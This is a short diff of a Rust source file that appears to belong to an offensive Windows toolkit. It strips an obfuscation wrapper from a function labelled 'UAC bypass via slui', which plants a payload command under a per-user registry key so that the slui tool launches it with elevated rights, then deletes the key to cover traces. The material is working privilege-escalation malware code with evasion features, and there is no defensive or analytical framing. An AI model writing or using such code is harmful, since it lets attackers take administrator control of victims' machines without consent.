@@ -1,4 +1,4 @@
-use encstr::{astr, cobl, opaque_false};
+use encstr::astr;
 use std::process::{Command, Stdio};
 use std::thread;
 use std::time::Duration;
@@ -59,10 +59,6 @@ pub fn launch_with_fsr_disabled(program: &str) -> std::io::Result<()> {
 
 /// UAC bypass via slui
 pub fn uac_slui(payload: &String) {
-    cobl!({
-    if opaque_false() {
-        return;
-    }
     let path = astr!("Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command");
 
     let _ = delete_hkcu_key(&path);
@@ -91,5 +87,4 @@ pub fn uac_slui(payload: &String) {
         thread::sleep(Duration::from_secs(5));
         let _ = delete_hkcu_key(&cleanup_path);
     });
-    })
 }
